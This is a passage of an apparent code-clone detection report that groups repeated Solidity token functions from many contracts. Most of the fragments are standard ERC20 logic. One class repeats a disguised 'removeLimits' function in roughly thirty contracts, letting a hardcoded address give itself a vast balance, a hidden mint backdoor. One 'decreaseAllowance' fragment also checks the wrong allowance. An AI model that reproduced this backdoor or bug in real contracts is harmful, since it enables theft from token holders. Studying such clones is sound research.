<source file="systems/source-code/0x2C898DEc3Fb5e548b771E1A2DA4230ea7989BFF9.sol" startline="121" endline="131" pcid="1316">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xde0c85748435e9413a95aD4ED9f1c1fCe22685A9.sol" startline="122" endline="132" pcid="7936">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xF8cde3CAf78d43cF6e15181858c0923027B24cDd.sol" startline="122" endline="132" pcid="9065">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x8fE05D10B3c7aE008165Db5FA6a472c25E666A7F.sol" startline="124" endline="134" pcid="5274">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x393150326998e07F1d4B3D013dB62c5D0890352A.sol" startline="125" endline="135" pcid="1891">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xC2DF29A6Ee0a3C12446E45Ad1340A30fEF33a6A9.sol" startline="125" endline="135" pcid="6977">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x3Bc0F912FcCA2528801E55FcA480F54f69a9c886.sol" startline="126" endline="136" pcid="2057">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x8Dfec76a1104A22faAD1c7Ba7A90d9508e3eF5a7.sol" startline="121" endline="131" pcid="5208">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xeE35812e1254Da3Bd81eA1ba4275f2001085d671.sol" startline="121" endline="131" pcid="8699">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x700ab19C3D9FA23d1A194761eddD9986Aa620293.sol" startline="123" endline="133" pcid="4114">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x8e828c6761A342fa4204d8827A8b81B35904471B.sol" startline="123" endline="133" pcid="5223">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x76F7c76B8bcb64CEBcDCd6eE7D9eA3F4A4203CF8.sol" startline="127" endline="137" pcid="4483">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xb07F1e635FbA15234B11A351Ee03Da67D11111B2.sol" startline="126" endline="136" pcid="6508">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xc1143D26004Ec3253eF0aB4500113105164aA789.sol" startline="128" endline="138" pcid="6932">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xe022f7a1F743C18e28ABa062FCFa0746CbaE8d32.sol" startline="121" endline="131" pcid="8026">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x33F474718b13546c5A717Ff1Fbd2d8BcaB6Fdd45.sol" startline="123" endline="133" pcid="1603">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x8227de806a54ce72c23fab6f175d80d688536d7a.sol" startline="122" endline="132" pcid="4879">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x1f3adE6D938122006C0Dc9fb893d767080123917.sol" startline="118" endline="128" pcid="982">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
</class>

<class classid="41" nclones="2" nlines="6" similarity="100">
<source file="systems/source-code/0x02ab29a17d2a8446af2559ff31bdee27ae3dd944.sol" startline="51" endline="63" pcid="108">
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public returns (bool) {
        _transfer(sender, recipient, amount);
        require(
            _allowances[sender][msg.sender] >= amount,
            "ERC20: transfer amount exceeds allowance"
        );
        _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
        return true;
    }
</source>
<source file="systems/source-code/0xB95dAA5D1A88eD95C2d32f4b48A40c5cC48EDfed.sol" startline="51" endline="63" pcid="6700">
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public returns (bool) {
        _transfer(sender, recipient, amount);
        require(
            _allowances[sender][msg.sender] >= amount,
            "ERC20: transfer amount exceeds allowance"
        );
        _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
        return true;
    }
</source>
</class>

<class classid="42" nclones="2" nlines="6" similarity="100">
<source file="systems/source-code/0x02ab29a17d2a8446af2559ff31bdee27ae3dd944.sol" startline="65" endline="73" pcid="109">
    function increaseAllowance(
        address spender,
        uint256 addedValue
    ) public returns (bool) {
        uint c = _allowances[msg.sender][spender] + addedValue;
        require(c >= addedValue, "SafeMath: addition overflow");
        _approve(msg.sender, spender, c);
        return true;
    }
</source>
<source file="systems/source-code/0xB95dAA5D1A88eD95C2d32f4b48A40c5cC48EDfed.sol" startline="65" endline="73" pcid="6701">
    function increaseAllowance(
        address spender,
        uint256 addedValue
    ) public returns (bool) {
        uint c = _allowances[msg.sender][spender] + addedValue;
        require(c >= addedValue, "SafeMath: addition overflow");
        _approve(msg.sender, spender, c);
        return true;
    }
</source>
</class>

<class classid="43" nclones="2" nlines="5" similarity="100">
<source file="systems/source-code/0x02ab29a17d2a8446af2559ff31bdee27ae3dd944.sol" startline="75" endline="89" pcid="110">
    function decreaseAllowance(
        address spender,
        uint256 subtractedValue
    ) public returns (bool) {
        require(
            _allowances[msg.sender][msg.sender] >= subtractedValue,
            "ERC20: decreased allowance below zero"
        );
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][msg.sender] - subtractedValue
        );
        return true;
    }
</source>
<source file="systems/source-code/0xB95dAA5D1A88eD95C2d32f4b48A40c5cC48EDfed.sol" startline="75" endline="89" pcid="6702">
    function decreaseAllowance(
        address spender,
        uint256 subtractedValue
    ) public returns (bool) {
        require(
            _allowances[msg.sender][msg.sender] >= subtractedValue,
            "ERC20: decreased allowance below zero"
        );
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][msg.sender] - subtractedValue
        );
        return true;
    }
</source>
</class>

<class classid="44" nclones="4" nlines="4" similarity="100">
<source file="systems/source-code/0x02ab29a17d2a8446af2559ff31bdee27ae3dd944.sol" startline="91" endline="94" pcid="111">
    function mint(uint256 amount) public onlyOwner returns (bool) {
        _mint(msg.sender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xB95dAA5D1A88eD95C2d32f4b48A40c5cC48EDfed.sol" startline="91" endline="94" pcid="6703">
    function mint(uint256 amount) public onlyOwner returns (bool) {
        _mint(msg.sender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xF532E8298D9b5021cb762EDe236493BE8Fff30B4.sol" startline="106" endline="109" pcid="8965">
    function burn(uint256 amount) public onlyOwner returns (bool) {
        _burn(msg.sender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xf65eaef03505f9c2b457d479797b77401e6dd9ac.sol" startline="106" endline="109" pcid="9009">
    function burn(uint256 amount) public onlyOwner returns (bool) {
        _burn(msg.sender, amount);
        return true;
    }
</source>
</class>

<class classid="45" nclones="2" nlines="10" similarity="100">
<source file="systems/source-code/0x02ab29a17d2a8446af2559ff31bdee27ae3dd944.sol" startline="96" endline="112" pcid="112">
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(
            _balances[sender] >= amount,
            "ERC20: transfer amount exceeds balance"
        );
        _balances[sender] -= amount;
        uint c = _balances[recipient] + amount;
        require(c >= amount, "SafeMath: addition overflow");
        _balances[recipient] = c;
        emit Transfer(sender, recipient, amount);
    }
</source>
<source file="systems/source-code/0xB95dAA5D1A88eD95C2d32f4b48A40c5cC48EDfed.sol" startline="96" endline="112" pcid="6704">
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(
            _balances[sender] >= amount,
            "ERC20: transfer amount exceeds balance"
        );
        _balances[sender] -= amount;
        uint c = _balances[recipient] + amount;
        require(c >= amount, "SafeMath: addition overflow");
        _balances[recipient] = c;
        emit Transfer(sender, recipient, amount);
    }
</source>
</class>

<class classid="46" nclones="2" nlines="8" similarity="100">
<source file="systems/source-code/0x02ab29a17d2a8446af2559ff31bdee27ae3dd944.sol" startline="114" endline="121" pcid="113">
    function _mint(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");
        uint c = totalSupply + amount;
        require(c >= amount, "SafeMath: addition overflow");
        totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }
</source>
<source file="systems/source-code/0xB95dAA5D1A88eD95C2d32f4b48A40c5cC48EDfed.sol" startline="114" endline="121" pcid="6705">
    function _mint(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");
        uint c = totalSupply + amount;
        require(c >= amount, "SafeMath: addition overflow");
        totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }
</source>
</class>

<class classid="47" nclones="4" nlines="7" similarity="83">
<source file="systems/source-code/0x02ab29a17d2a8446af2559ff31bdee27ae3dd944.sol" startline="123" endline="132" pcid="114">
    function _burn(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: burn from the zero address");
        require(
            _balances[account] >= amount,
            "ERC20: burn amount exceeds balance"
        );
        _balances[account] -= amount;
        totalSupply -= amount;
        emit Transfer(account, address(0), amount);
    }
</source>
<source file="systems/source-code/0xB95dAA5D1A88eD95C2d32f4b48A40c5cC48EDfed.sol" startline="123" endline="132" pcid="6706">
    function _burn(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: burn from the zero address");
        require(
            _balances[account] >= amount,
            "ERC20: burn amount exceeds balance"
        );
        _balances[account] -= amount;
        totalSupply -= amount;
        emit Transfer(account, address(0), amount);
    }
</source>
<source file="systems/source-code/0xF532E8298D9b5021cb762EDe236493BE8Fff30B4.sol" startline="137" endline="144" pcid="8969">
    function _burn(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: burn from the zero address");
        require(_balances[account] >= amount, "ERC20: insufficient balance");

        _balances[account] -= amount;
        _totalSupply -= amount;
        emit Transfer(account, address(0), amount);
    }
</source>
<source file="systems/source-code/0xf65eaef03505f9c2b457d479797b77401e6dd9ac.sol" startline="137" endline="144" pcid="9013">
    function _burn(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: burn from the zero address");
        require(_balances[account] >= amount, "ERC20: insufficient balance");

        _balances[account] -= amount;
        _totalSupply -= amount;
        emit Transfer(account, address(0), amount);
    }
</source>
</class>

<class classid="48" nclones="16" nlines="6" similarity="100">
<source file="systems/source-code/0x02ab29a17d2a8446af2559ff31bdee27ae3dd944.sol" startline="134" endline="143" pcid="115">
    function _approve(
        address account,
        address spender,
        uint256 amount
    ) internal {
        require(account != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[account][spender] = amount;
        emit Approval(account, spender, amount);
    }
</source>
<source file="systems/source-code/0x8EB829589a20Aa412577544cD6e9732087B691AB.sol" startline="305" endline="315" pcid="5240">
    function _approve(
        address owner,
        address spender,
        uint256 value
    ) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = value;
        emit Approval(owner, spender, value);
    }
</source>
<source file="systems/source-code/0x523747c5bed9b50161c801b4a4b7a7799a1add3c.sol" startline="101" endline="108" pcid="3047">
    function _approve(address owner, address spender, uint256 amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;

        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xE28c8C4FB5F5Fe07F53Eb527B60a217A75Cb00FC.sol" startline="485" endline="491" pcid="8120">
    function _approve(address owner, address spender, uint256 amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xdd34428a0dd260cc83608d16abcd1f8baf0c097c.sol" startline="398" endline="404" pcid="7884">
    function _approve(address owner, address spender, uint256 value) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = value;
        emit Approval(owner, spender, value);
    }
</source>
<source file="systems/source-code/0xe3294e522f9307592da7c9b290409772c6f89e5a.sol" startline="97" endline="102" pcid="8203">
    function _approve(address ownerAddr, address spender, uint256 amount) internal {
        require(ownerAddr != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[ownerAddr][spender] = amount;
        emit Approval(ownerAddr, spender, amount);
    }
</source>
<source file="systems/source-code/0x4396B7E63f562e7Bb603B31d9e9368dA29F9D579.sol" startline="208" endline="214" pcid="2495">
    function _approve(address _owner, address _spender, uint256 _value) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(_spender != address(0), "ERC20: approve to the zero address");

        allowance[_owner][_spender] = _value;
        emit Approval(_owner, _spender, _value);
    }
</source>
<source file="systems/source-code/0xB95dAA5D1A88eD95C2d32f4b48A40c5cC48EDfed.sol" startline="134" endline="143" pcid="6707">
    function _approve(
        address account,
        address spender,
        uint256 amount
    ) internal {
        require(account != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[account][spender] = amount;
        emit Approval(account, spender, amount);
    }
</source>
<source file="systems/source-code/0x3fdeaec806bd455a7f241a1b33f468b43cb2057b.sol" startline="213" endline="219" pcid="2327">
    function _approve(address _owner, address _spender, uint256 _value) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(_spender != address(0), "ERC20: approve to the zero address");

        allowance[_owner][_spender] = _value;
        emit Approval(_owner, _spender, _value);
    }
</source>
<source file="systems/source-code/0x1cFdab1D6685C85C299503BD1d3C6bab5e5933a1.sol" startline="118" endline="123" pcid="917">
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x2ccAcCb6b900968f85A738B2DFf1Db106ABbB501.sol" startline="208" endline="214" pcid="1333">
    function _approve(address _owner, address _spender, uint256 _value) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(_spender != address(0), "ERC20: approve to the zero address");

        allowance[_owner][_spender] = _value;
        emit Approval(_owner, _spender, _value);
    }
</source>
<source file="systems/source-code/0x3Ad865f49cb532cE565677635F9ED7b3CbF27A5d.sol" startline="398" endline="404" pcid="1988">
    function _approve(address owner, address spender, uint256 value) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = value;
        emit Approval(owner, spender, value);
    }
</source>
<source file="systems/source-code/0x71ee7f095E811A3dE31cbea5fB6aBCdC5aFaE9f4.sol" startline="199" endline="205" pcid="4195">
    function _approve(address _owner, address _spender, uint256 _value) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(_spender != address(0), "ERC20: approve to the zero address");

        allowance[_owner][_spender] = _value;
        emit Approval(_owner, _spender, _value);
    }
</source>
<source file="systems/source-code/0xF532E8298D9b5021cb762EDe236493BE8Fff30B4.sol" startline="121" endline="127" pcid="8967">
    function _approve(address owner, address spender, uint256 amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xf65eaef03505f9c2b457d479797b77401e6dd9ac.sol" startline="121" endline="127" pcid="9011">
    function _approve(address owner, address spender, uint256 amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x5f60596411116de6c38ac8d68c159700cf72db3f.sol" startline="68" endline="74" pcid="3612">
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
</class>

<class classid="49" nclones="4" nlines="3" similarity="100">
<source file="systems/source-code/0x02ab29a17d2a8446af2559ff31bdee27ae3dd944.sol" startline="145" endline="147" pcid="116">
    function mintTo(address account, uint256 amount) external onlyOwner {
        _mint(account, amount);
    }
</source>
<source file="systems/source-code/0x02ab29a17d2a8446af2559ff31bdee27ae3dd944.sol" startline="149" endline="151" pcid="117">
    function burnFrom(address account, uint256 amount) external onlyOwner {
        _burn(account, amount);
    }
</source>
<source file="systems/source-code/0xB95dAA5D1A88eD95C2d32f4b48A40c5cC48EDfed.sol" startline="149" endline="151" pcid="6709">
    function burnFrom(address account, uint256 amount) external onlyOwner {
        _burn(account, amount);
    }
</source>
<source file="systems/source-code/0xB95dAA5D1A88eD95C2d32f4b48A40c5cC48EDfed.sol" startline="145" endline="147" pcid="6708">
    function mintTo(address account, uint256 amount) external onlyOwner {
        _mint(account, amount);
    }
</source>
</class>

<class classid="50" nclones="40" nlines="5" similarity="100">
<source file="systems/source-code/0x033B28BE598a95363830624C0601E58AB03e9922.sol" startline="44" endline="48" pcid="119">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 4206900000*42000*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x543f7c0cC91011d96D5Bc2fF8C7C12e5c60D1b29.sol" startline="42" endline="46" pcid="3127">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 4206900000*42000*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x6d1456049210842b851a60C4ca116179658eF07a.sol" startline="43" endline="47" pcid="4010">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 4206900000*42000*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x545189e64a542b50e06902bceec0f536c662f46d.sol" startline="42" endline="46" pcid="3142">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 4206900000*42000*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xcd8bdb2857ea0948122ccb9b17fc2a6d721b97ae.sol" startline="43" endline="47" pcid="7290">
    function limitClaims(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 4206900000*42000*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xF8cde3CAf78d43cF6e15181858c0923027B24cDd.sol" startline="42" endline="46" pcid="9052">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 4206900000*42000*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x1b6B980b58C60aB35EeE3894Fc225E711B20f472.sol" startline="44" endline="48" pcid="853">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 4206900000*42000*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xc3269e2917AcF46F7eDF508cf875f8e29313dabF.sol" startline="41" endline="45" pcid="6979">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 4206900000*42000*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x1E8203DF1f5488659b9Ff0F39366014Df7d7068D.sol" startline="43" endline="47" pcid="954">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 4206900000*42000*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xae68a4d3aED530bDfca9316fB3f757A8cd27a0e4.sol" startline="43" endline="47" pcid="6328">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 4206900000*42000*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x26aC04336C1A7ad637c1ab4578A59ce17E1d9Fd9.sol" startline="43" endline="47" pcid="1215">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 4206900000*42000*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x80243a2b6dfb564459fec3e729fda998a4b7a979.sol" startline="43" endline="47" pcid="4721">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 4206900000*42000*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x2AE6bAa928cFeD647807104d4de73aA779a8f433.sol" startline="43" endline="47" pcid="1273">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 4206900000*42000*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xa6AC064774bF25B7Ee251C3F051Aabf28A01DCb4.sol" startline="42" endline="46" pcid="6068">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 4206900000*42000*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x80a2f100cb796a142faca9f6ffc31dabb0b0663f.sol" startline="43" endline="47" pcid="4787">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 4206900000*42000*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xa5bf4225edeFe7bdA05825b60D5497e2a5445F1e.sol" startline="42" endline="46" pcid="6029">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 4206900000*42000*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x35539cc6f1f1c0449474fdaaa0939893457163da.sol" startline="43" endline="47" pcid="1778">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 4206900000*42000*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xa42284f1617bc85bd6c0139f9482b0908ee42915.sol" startline="43" endline="47" pcid="5955">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 4206900000*42000*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x9e765D69c813b6A14835Ff2299aF610561DA2D06.sol" startline="42" endline="46" pcid="5698">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 4206900000*42000*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x9a5d0F32B00BDB418D7667AE36d36eA15FDe594e.sol" startline="43" endline="47" pcid="5623">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 4206900000*42000*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x30c12bcdd3f52ec30ed4686de301e710e862eb55.sol" startline="43" endline="47" pcid="1518">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 4206900000*42000*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x93641b862C7C657138896678Ab745592D7072C15.sol" startline="43" endline="47" pcid="5349">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 4206900000*42000*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x33F474718b13546c5A717Ff1Fbd2d8BcaB6Fdd45.sol" startline="43" endline="47" pcid="1590">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 4206900000*42000*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x8f5b2832b8D440cf00B5Ef5a37d12DC9d96F0839.sol" startline="44" endline="48" pcid="5246">
    function limitClaims(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 4206900000*42000*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xDBc4b8F7D65167C5f44426dbb95Ec8921F629386.sol" startline="42" endline="46" pcid="7783">
    function cleanLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 4206900000*42000*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x13d0A3A7D4Ca790E93874a93ED664a301291bBEe.sol" startline="42" endline="46" pcid="527">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 4206900000*42000*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x13aa62cE2b990807c069d04A61E8475c45a150E5.sol" startline="43" endline="47" pcid="512">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 4206900000*42000*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xe10f1b5466b361c9c8c735021A6d00CDea855763.sol" startline="44" endline="48" pcid="8085">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 4206900000*42000*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x10682fF02FC98F7FB6ceA08e7a584262DB51a399.sol" startline="43" endline="47" pcid="427">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 4206900000*42000*addBot*10**tokenDecimals;
        }
    } 
</source>
